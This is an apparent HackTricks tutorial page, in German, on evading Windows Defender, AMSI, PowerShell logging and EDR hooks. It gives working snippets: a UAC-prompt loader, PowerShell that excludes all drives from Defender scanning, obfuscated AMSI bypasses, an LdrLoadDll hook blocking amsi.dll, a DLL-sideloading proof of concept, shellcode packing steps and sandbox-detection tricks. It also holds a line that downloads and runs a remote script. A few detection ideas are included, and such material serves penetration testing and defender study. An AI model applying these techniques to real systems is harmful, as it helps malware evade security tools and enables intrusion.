# Antivirus (AV)-Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** verfasst!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, das Windows Defender am Funktionieren hindert.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender durch das Vortäuschen eines anderen AV am Funktionieren hindert.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor Manipulationen an Defender

Öffentlich verfügbare Loader, die sich häufig als Game-Cheats ausgeben, werden oft als unsignierte Node.js/Nexe-Installer ausgeliefert, die den Benutzer zunächst **zur Erhöhung der Berechtigungen auffordern** und erst danach Defender deaktivieren. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob ein administrativer Kontext vorliegt. Der Befehl ist nur erfolgreich, wenn der Aufrufer über Admin-Rechte verfügt. Ein Fehlschlag zeigt daher an, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort selbst mit dem Verb `RunAs` erneut starten, um den erwarteten UAC-Zustimmungsdialog auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie „gecrackte“ Software installieren, daher wird die Eingabeaufforderung normalerweise akzeptiert, wodurch die Malware die benötigten Rechte erhält, um die Richtlinie von Defender zu ändern.<sup>[[26]](#references)</sup>

### Blanket-`MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Rechteerweiterung maximieren Chains im Stil von GachiLoader die blinden Flecken von Defender, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt anschließend **extrem weitreichende Ausschlüsse**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jeder Wechseldatenträger nicht gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Wichtige Beobachtungen:

- Die Schleife durchläuft jedes gemountete Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jedes zukünftige Payload, das irgendwo auf der Festplatte abgelegt wird, ignoriert wird**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert – Angreifer behalten sich die Option vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, sodass spätere Phasen bestätigen können, dass die Ausschlüsse bestehen bleiben, oder sie erweitern können, ohne UAC erneut auszulösen.

Da kein Defender-Dienst gestoppt wird, melden naive Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nie überprüft.<sup>[[26]](#references)</sup>

## **Methodology zur AV Evasion**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und bei den fortgeschritteneren EDRs behavioural analysis.

### **Static detection**

Static detection wird erreicht, indem bekannte bösartige Strings oder Byte-Arrays in einer Binary oder einem Script markiert werden und außerdem Informationen aus der Datei selbst extrahiert werden (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Prüfsumme usw.). Das bedeutet, dass du bei der Verwendung bekannter öffentlicher Tools leichter entdeckt werden kannst, da diese wahrscheinlich analysiert und als bösartig markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Encryption**

Wenn du die Binary verschlüsselst, kann AV dein Programm nicht erkennen, aber du benötigst eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuscation**

Manchmal musst du nur einige Strings in deiner Binary oder deinem Script ändern, damit es AV passiert, aber abhängig davon, was du obfuscaten möchtest, kann dies zeitaufwendig sein.

- **Custom tooling**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten schädlichen Signaturen, aber das erfordert viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die static detection von Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente auf und weist Defender anschließend an, jedes davon einzeln zu scannen. So kann es dir genau sagen, welche Strings oder Bytes in deiner Binary markiert wurden.

Ich empfehle dir dringend, diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis bedeutet, dass das AV deine Binary in einer Sandbox ausführt und auf bösartige Aktivitäten achtet (z. B. der Versuch, die Passwörter deines Browsers zu entschlüsseln und zu lesen, ein Minidump von LSASS usw.). Dieser Teil kann etwas schwieriger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Vor der Ausführung schlafen** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamic analysis von AVs zu umgehen. AVs haben nur sehr wenig Zeit, um Dateien zu scannen, damit der Workflow des Benutzers nicht unterbrochen wird. Lange Sleeps können daher die Analyse von Binaries stören. Das Problem ist, dass viele AV-Sandboxes den Sleep abhängig von der Implementierung einfach überspringen können.
- **Ressourcen des Computers prüfen** Normalerweise verfügen Sandboxes über sehr wenige Ressourcen (z. B. < 2 GB RAM), da sie andernfalls den Computer des Benutzers verlangsamen könnten. Du kannst auch sehr kreativ werden, indem du beispielsweise die Temperatur der CPU oder sogar die Lüftergeschwindigkeit prüfst; nicht alles davon wird in der Sandbox implementiert sein.
- **Maschinenspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation der Domain „contoso.local“ beigetreten ist, kannst du die Domain des Computers prüfen, um festzustellen, ob sie mit der von dir angegebenen übereinstimmt. Falls nicht, kannst du dein Programm beenden lassen.

Es hat sich herausgestellt, dass der Computername der Microsoft Defender Sandbox HAL9TH ist. Du kannst daher vor der Detonation den Computernamen in deiner Malware prüfen. Wenn der Name HAL9TH entspricht, bedeutet das, dass du dich in der Defender-Sandbox befindest, und du kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie wir bereits in diesem Beitrag gesagt haben, werden **public tools** letztendlich **erkannt**, daher solltest du dir eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpt.

Die richtige Antwort ist wahrscheinlich Letzteres. Wenn man mimikatz als Beispiel nimmt, ist es wahrscheinlich eines der am häufigsten, wenn nicht sogar das am häufigsten von AVs und EDRs markierten Malware-Programme. Obwohl das Projekt selbst sehr cool ist, ist es auch ein Albtraum, damit die AVs zu umgehen. Suche daher einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads für Evasion modifizierst, stelle sicher, dass du in Defender die **automatische Übermittlung von Samples deaktivierst**, und bitte, im Ernst, **LADE NICHT AUF VIRUSTOTAL HOCH**, wenn dein Ziel langfristige Evasion ist. Wenn du überprüfen möchtest, ob dein Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer möglich, solltest du für Evasion immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert. Daher ist dies in manchen Fällen ein sehr einfacher Trick, um einer Erkennung zu entgehen (falls dein Payload natürlich auf irgendeine Weise als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen können, hat ein DLL Payload von Havoc in antiscan.me eine Erkennungsrate von 4/26, während das EXE Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem sowohl die Opferanwendung als auch die schädlichen Payload(s) nebeneinander platziert werden.

Du kannst mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script nach Programmen suchen, die für DLL Sideloading anfällig sind:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking innerhalb von "C:\Program Files\\" anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable programs selbst zu erkunden**. Diese Technik ist bei korrekter Umsetzung ziemlich unauffällig. Wenn du jedoch öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht entdeckt werden.

Allein das Platzieren einer bösartigen DLL mit dem Namen, den ein Programm zu laden erwartet, führt nicht dazu, dass dein payload geladen wird, da das Programm bestimmte Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm ausführt, vom Proxy (und der bösartigen) DLL an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten, während dein payload ausgeführt werden kann.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die umbenannte originale DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die Proxy-DLL haben in [antiscan.me](https://antiscan.me) eine Detection rate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir den [Twitch-VOD von S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ippses Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das, was wir besprochen haben, im Detail zu erfahren.

### Forwarded Exports missbrauchen (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Statt auf Code zu zeigen, enthält der Export-Eintrag einen ASCII-String im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows Loader Folgendes aus:

- `TargetDll` laden, falls es noch nicht geladen wurde
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen, die man verstehen sollte:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL search order verwendet, die auch das Verzeichnis des Moduls enthält, das die Forward-Auflösung durchführt.

Dies ermöglicht eine indirekte Sideloading-Primitivtechnik: Finde eine signierte DLL, die eine Funktion exportiert, die an einen Nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer von einem Angreifer kontrollierten DLL, die exakt wie das weitergeleitete Zielmodul benannt ist. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader den Forward auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein `DllMain` ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Lösen Sie die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die side-by-side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du den Fehler „missing API“ erst, nachdem `DllMain` bereits ausgeführt wurde

Tipps für die Suche:
- Konzentriere dich auf weitergeleitete Exports, deren Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Weitergeleitete Exports kannst du mit Tools wie den folgenden auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 forwarder inventory, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Bei Prozess-/Modulketten wie dieser alarmieren: `rundll32.exe` → nicht systemgebundene `keyiso.dll` → `NCRYPTPROV.dll` unter benutzerschreibbaren Pfaden
- Richtlinien zur Codeintegrität (WDAC/AppLocker) durchsetzen und Schreib- und Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe angehaltener Prozesse, direkter Syscalls und alternativer Ausführungsmethoden`

Du kannst Freeze verwenden, um deinen Shellcode verdeckt zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel. Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher niemals nur auf ein Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu verketten.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs platzieren häufig **user-mode inline hooks** auf den Syscall-Stubs von `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direct** oder **indirect syscall stubs** generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Entrypoint auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion in den generierten Stub einfügen (kein Treffer auf einen `ntdll`-Export).
- **Indirect**: In ein vorhandenes `syscall`-Gadget innerhalb von `ntdll` springen, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur heuristischen Umgehung); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool.
- **Egg-hunt**: Vermeiden, die statische Opcode-Sequenz `0F 05` auf der Festplatte einzubetten; stattdessen eine Syscall-Sequenz zur Laufzeit auflösen.

**Hook-resistente SSN-Auflösungsstrategien:**
- **FreshyCalls (VA sort)**: SSNs durch Sortieren der Syscall-Stubs nach virtueller Adresse ableiten, anstatt die Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Eine saubere `\KnownDlls\ntdll.dll` mappen, SSNs aus deren `.text` auslesen und sie anschließend wieder unmapen (umgeht alle In-Memory-Hooks).
- **RecycledGate**: VA-sortierte SSN-Inferenz mit Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei einem Hook auf VA-Inferenz zurückfallen.
- **HW Breakpoint**: DR0 auf der `syscall`-Instruktion setzen und einen VEH verwenden, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Ursprünglich waren AVs nur in der Lage, **Dateien auf dem Datenträger** zu scannen. Wenn man also irgendwie Payloads **direkt im Speicher** ausführen konnte, konnte der AV nichts dagegen unternehmen, da ihm nicht genügend Einblick zur Verfügung stand.

Das AMSI-Feature ist in diese Windows-Komponenten integriert.

- Benutzerkontensteuerung (User Account Control, UAC; Erhöhung der Berechtigungen von EXE-, COM- oder MSI-Dateien sowie ActiveX-Installation)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Es ermöglicht Antivirus-Lösungen, das Verhalten von Skripten zu untersuchen, indem Skriptinhalte in einer Form offengelegt werden, die sowohl unverschlüsselt als auch nicht verschleiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt unter Windows Defender den folgenden Alert.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, aus der das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf den Datenträger geschrieben, wurden aber aufgrund von AMSI trotzdem im Speicher erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls über AMSI ausgeführt. Dies betrifft sogar `Assembly.Load(byte[])`, um die Ausführung im Speicher zu laden. Deshalb wird für die Ausführung im Speicher die Verwendung niedrigerer .NET-Versionen (wie 4.7.2 oder niedriger) empfohlen, wenn man AMSI umgehen möchte.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der zu ladenden Skripte eine gute Möglichkeit sein, einer Erkennung zu entgehen.

AMSI ist jedoch in der Lage, Skripte auch dann zu deobfuskieren, wenn sie mehrere Ebenen enthalten. Daher kann Obfuscation abhängig von ihrer Umsetzung eine schlechte Option sein. Dadurch ist das Umgehen nicht ganz unkompliziert. Manchmal reicht es allerdings aus, einige Variablennamen zu ändern, und man ist erfolgreich. Es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den powershell-Prozess (ebenso cscript.exe, wscript.exe usw.) geladen wird, kann sie leicht manipuliert werden, selbst wenn man als nicht privilegierter Benutzer ausgeführt wird. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, das AMSI-Scanning zu umgehen.

**Forcing an Error**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, woraufhin Microsoft eine Signatur entwickelt hat, um eine weitere Verbreitung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es war lediglich eine Zeile PowerShell-Code erforderlich, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen erforderlich, um diese Technik verwenden zu können.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird. Du solltest daher keinen Code veröffentlichen, wenn du unentdeckt bleiben möchtest.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Sie besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll zu finden (zuständig für das Scannen der vom Benutzer bereitgestellten Eingaben) und sie mit Anweisungen zu überschreiben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des tatsächlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), um eine ausführlichere Erklärung zu erhalten.

Es gibt außerdem viele weitere Techniken, um AMSI mit powershell zu umgehen. Sieh dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es finden für diesen Prozess keine Scans statt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64 C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notizen
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loaders (mit allem, was AMSI andernfalls laden würde).
- In Kombination mit dem Übergeben von Scripts über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) lassen sich lange Command-Line-Artefakte vermeiden.
- Wird bei Loadern verwendet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Scripts zum Bypass von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Scripts zum Bypass von AMSI, die Signaturen durch zufällige benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke vermeiden und eine zufällige Groß- und Kleinschreibung auf PowerShell-Schlüsselwörter anwenden, um Signaturen zu vermeiden.

**Die erkannte Signatur entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool durchsucht den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Scripts ausführen kannst, ohne dass sie von AMSI gescannt werden. Das kannst du folgendermaßen tun:
```bash
powershell.exe -version 2
```
## PS-Logging

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Dies kann für Auditing- und Troubleshooting-Zwecke nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen möchten**.

Um PowerShell-Logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Sie können hierfür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell version 2 verwenden**: Wenn Sie PowerShell version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Scripts ausführen können, ohne von AMSI gescannt zu werden. Dies ist möglich mit: `powershell.exe -version 2`
- **Eine unmanaged PowerShell session verwenden**: Verwenden Sie [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der von Cobalt Strike's `powerpick` verwendete Ansatz). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Abwehrmechanismen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Runtime und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten. Dadurch wird die Entropie der Binary erhöht, was es AVs und EDRs erleichtert, sie zu erkennen. Seien Sie dabei vorsichtig und wenden Sie Verschlüsselung möglicherweise nur auf bestimmte Abschnitte Ihres Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow **stellt zuverlässig ein nahezu ursprüngliches IL wieder her**, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

